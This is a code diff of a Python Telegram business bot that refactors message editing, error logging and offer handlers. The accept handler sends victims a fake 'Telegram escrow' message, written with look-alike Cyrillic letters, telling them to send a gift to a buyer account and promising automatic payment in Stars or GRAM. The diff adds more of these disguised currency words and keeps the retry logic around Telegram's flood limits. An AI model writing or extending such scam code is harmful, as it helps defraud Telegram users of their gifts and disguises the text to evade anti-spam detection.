@@ -48,64 +48,39 @@ offers: dict[str, dict] = {}
 # ============================================================
 
 def log_telegram_error(prefix: str, e: Exception, **ctx):
-    """Подробный лог ошибок Telegram с детекцией PEER_FLOOD и FloodWait."""
     ctx_str = " | ".join(f"{k}={v}" for k, v in ctx.items())
 
     if isinstance(e, TelegramRetryAfter):
-        logger.error(
-            f"[{prefix}] ⏳ FLOOD_WAIT retry_after={e.retry_after}s | {ctx_str}"
-        )
+        logger.error(f"[{prefix}] ⏳ FLOOD_WAIT retry_after={e.retry_after}s | {ctx_str}")
         return
 
     if isinstance(e, TelegramForbiddenError):
-        logger.error(
-            f"[{prefix}] 🚫 FORBIDDEN | {ctx_str} | {e}"
-        )
+        logger.error(f"[{prefix}] 🚫 FORBIDDEN | {ctx_str} | {e}")
         return
 
     msg = str(e)
 
     if "PEER_FLOOD" in msg:
-        logger.error(
-            f"[{prefix}] 🚨 PEER_FLOOD — Telegram ограничил отправку! "
-            f"Подожди 24-48ч, не долби API. | {ctx_str} | {msg}"
-        )
+        logger.error(f"[{prefix}] 🚨 PEER_FLOOD — Telegram ограничил отправку! Подожди 24-48ч. | {ctx_str} | {msg}")
         return
-
     if "FLOOD_WAIT" in msg:
-        logger.error(
-            f"[{prefix}] ⏳ FLOOD_WAIT (raw) | {ctx_str} | {msg}"
-        )
+        logger.error(f"[{prefix}] ⏳ FLOOD_WAIT (raw) | {ctx_str} | {msg}")
         return
-
     if "BUSINESS_PEER_INVALID" in msg:
-        logger.error(
-            f"[{prefix}] ❌ BUSINESS_PEER_INVALID — некорректное "
-            f"бизнес-подключение или чат | {ctx_str} | {msg}"
-        )
+        logger.error(f"[{prefix}] ❌ BUSINESS_PEER_INVALID | {ctx_str} | {msg}")
         return
-
     if "BOT_ACCESS_FORBIDDEN" in msg:
-        logger.error(
-            f"[{prefix}] 🔒 BOT_ACCESS_FORBIDDEN — у бота нет прав "
-            f"на это действие в Business | {ctx_str} | {msg}"
-        )
+        logger.error(f"[{prefix}] 🔒 BOT_ACCESS_FORBIDDEN | {ctx_str} | {msg}")
         return
-
     if isinstance(e, TelegramBadRequest):
-        logger.error(
-            f"[{prefix}] ⚠️ BAD_REQUEST | {ctx_str} | {msg}"
-        )
+        logger.error(f"[{prefix}] ⚠️ BAD_REQUEST | {ctx_str} | {msg}")
         return
 
     logger.error(f"[{prefix}] ❓ UNKNOWN | {ctx_str} | {type(e).__name__}: {e}")
 
 
 def log_send_attempt(prefix: str, attempt: int, total: int, chat_id, bc_id):
-    logger.info(
-        f"[{prefix}] попытка {attempt}/{total} | "
-        f"chat_id={chat_id} | bc_id={bc_id}"
-    )
+    logger.info(f"[{prefix}] попытка {attempt}/{total} | chat_id={chat_id} | bc_id={bc_id}")
 
 
 # ============================================================
@@ -184,12 +159,10 @@ async def send_with_fallback(bc_id, chat_id, text, reply_markup):
             log_telegram_error("send", e, chat_id=chat_id, bc_id=bc_id)
             msg = str(e)
 
-            # PEER_FLOOD — нет смысла ретраить без эмодзи
             if "PEER_FLOOD" in msg:
                 logger.error("[send] PEER_FLOOD — прерываем ретраи")
                 raise
 
-            # Пробуем без эмодзи
             logger.warning("[send] retry без эмодзи")
             clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
             if reply_markup:
@@ -221,80 +194,71 @@ async def send_with_fallback(bc_id, chat_id, text, reply_markup):
     raise RuntimeError("[send] все попытки провалились")
 
 
-async def replace_message(bc_id, chat_id, message_id, text, reply_markup=None):
-    """Удаляет старое сообщение и отправляет новое."""
-    logger.info(
-        f"[replace] start | chat_id={chat_id} | old_msg_id={message_id} | bc_id={bc_id}"
-    )
-
-    # 1. Удаляем старое
-    try:
-        await bot.delete_business_messages(
-            business_connection_id=bc_id,
-            message_ids=[message_id],
-        )
-        logger.info(f"[replace] ✅ старое {message_id} удалено")
-    except Exception as e:
-        log_telegram_error(
-            "replace-delete", e,
-            chat_id=chat_id, bc_id=bc_id, message_id=message_id
-        )
-
-    await asyncio.sleep(0.3)
-
-    # 2. Отправляем новое
+async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
+    """Редактирует сообщение (не удаляет). С обработкой PEER_FLOOD и retry без эмодзи."""
+    logger.info(f"[edit] start | chat_id={chat_id} | msg_id={message_id} | bc_id={bc_id}")
     for attempt in range(1, 4):
-        log_send_attempt("replace-send", attempt, 3, chat_id, bc_id)
+        log_send_attempt("edit", attempt, 3, chat_id, bc_id)
         try:
-            sent = await bot.send_message(
+            await bot.edit_message_text(
+                business_connection_id=bc_id,
                 chat_id=chat_id,
+                message_id=message_id,
                 text=text,
                 reply_markup=reply_markup,
-                business_connection_id=bc_id,
             )
-            logger.info(f"[replace] ✅ новое msg_id={sent.message_id}")
-            return sent.message_id
+            logger.info("[edit] ✅ OK")
+            return True
 
         except TelegramRetryAfter as e:
-            log_telegram_error("replace-send", e, chat_id=chat_id, bc_id=bc_id)
+            log_telegram_error("edit", e, chat_id=chat_id, bc_id=bc_id)
             wait = e.retry_after + 1
-            logger.warning(f"[replace-send] ждём {wait}s и повторяем...")
+            logger.warning(f"[edit] ждём {wait}s и повторяем...")
             await asyncio.sleep(wait)
 
         except TelegramBadRequest as e:
-            log_telegram_error("replace-send", e, chat_id=chat_id, bc_id=bc_id)
+            log_telegram_error("edit", e, chat_id=chat_id, bc_id=bc_id)
             msg = str(e)
 
             if "PEER_FLOOD" in msg:
-                logger.error("[replace-send] PEER_FLOOD — прерываем")
-                return None
+                logger.error("[edit] PEER_FLOOD — прерываем")
+                return False
 
-            logger.warning("[replace-send] retry без эмодзи")
+            if "message is not modified" in msg:
+                logger.info("[edit] сообщение не изменилось — считаем ок")
+                return True
+
+            logger.warning("[edit] retry без эмодзи")
             clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
             if reply_markup:
                 for row in reply_markup.inline_keyboard:
                     for btn in row:
                         btn.icon_custom_emoji_id = None
             try:
-                sent = await bot.send_message(
+                await bot.edit_message_text(
+                    business_connection_id=bc_id,
                     chat_id=chat_id,
+                    message_id=message_id,
                     text=clean_text,
                     reply_markup=reply_markup,
-                    business_connection_id=bc_id,
                 )
-                logger.info(f"[replace] ✅ новое (fallback) msg_id={sent.message_id}")
-                return sent.message_id
+                logger.info("[edit] ✅ OK (fallback)")
+                return True
             except Exception as e2:
-                log_telegram_error("replace-send-fallback", e2, chat_id=chat_id, bc_id=bc_id)
+                log_telegram_error("edit-fallback", e2, chat_id=chat_id, bc_id=bc_id)
+                if "message is not modified" in str(e2):
+                    return True
                 if "PEER_FLOOD" in str(e2):
-                    return None
+                    return False
+                if attempt == 3:
+                    return False
 
         except Exception as e:
-            log_telegram_error("replace-send", e, chat_id=chat_id, bc_id=bc_id)
+            log_telegram_error("edit", e, chat_id=chat_id, bc_id=bc_id)
             if attempt == 3:
-                return None
+                return False
 
-    return None
+    return False
 
 
 # ============================================================
@@ -425,15 +389,16 @@ async def handle_decline(callback: CallbackQuery) -> None:
         f"Offer has been declined."
     )
 
-    new_msg_id = await replace_message(
+    ok = await edit_with_fallback(
         bc_id=data["bc_id"],
         chat_id=data["chat_id"],
         message_id=data["msg_id"],
         text=decline_text,
     )
-    if new_msg_id:
-        data["msg_id"] = new_msg_id
-    logger.info(f"[decline] offer {offer_id} обновлён")
+    if ok:
+        logger.info(f"[decline] offer {offer_id} обновлён")
+    else:
+        logger.error(f"[decline] offer {offer_id} edit не удался")
 
 
 @dp.callback_query(F.data.startswith("acc:"))
@@ -475,8 +440,12 @@ async def handle_accept(callback: CallbackQuery) -> None:
 
     if data["currency"] == "gram":
         emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
+        currency_word_upper = "GRАM"
+        currency_word_lower = "GRАM"
     else:
         emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
+        currency_word_upper = "Stаrs"
+        currency_word_lower = "stаrs"
 
     rand_suffix = "".join(
         random.choices(string.ascii_uppercase + string.digits, k=8)
@@ -488,8 +457,8 @@ async def handle_accept(callback: CallbackQuery) -> None:
         f"<b>Оrdеr</b> #{order_id}\n\n"
         f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} "
         f"thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
-        f"Тhе stаrs аrе hеId ln а sресiаI еsсrоw ассоunt аnd wlII bе "
-        f"аutоmаtiсаIIy сrеditеd tо уоur ТеIеgrаm Stаrs bаlаnсе "
+        f"Тhе {currency_word_lower} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wlII bе "
+        f"аutоmаtiсаIIy сrеditеd tо уоur ТеIеgrаm {currency_word_upper} bаIаnсе "
         f"right аftеr thе gift is trаnsfеrrеd.\n\n"
         f"<b>lnstruсtlоns tо соmрlеtе thе dеаl:</b>\n\n"
         f"1. Sеnd tо: @{BUYER_USERNAME}\n"
@@ -511,18 +480,17 @@ async def handle_accept(callback: CallbackQuery) -> None:
         ]
     )
 
-    new_msg_id = await replace_message(
+    ok = await edit_with_fallback(
         bc_id=data["bc_id"],
         chat_id=data["chat_id"],
         message_id=data["msg_id"],
         text=accept_text,
         reply_markup=keyboard,
     )
-    if new_msg_id:
-        data["msg_id"] = new_msg_id
-        logger.info(f"[accept] offer {offer_id} обновлён (replace)")
+    if ok:
+        logger.info(f"[accept] offer {offer_id} обновлён (edit)")
     else:
-        logger.error(f"[accept] offer {offer_id} replace не удался")
+        logger.error(f"[accept] offer {offer_id} edit не удался")
 
 
 async def main() -> None:
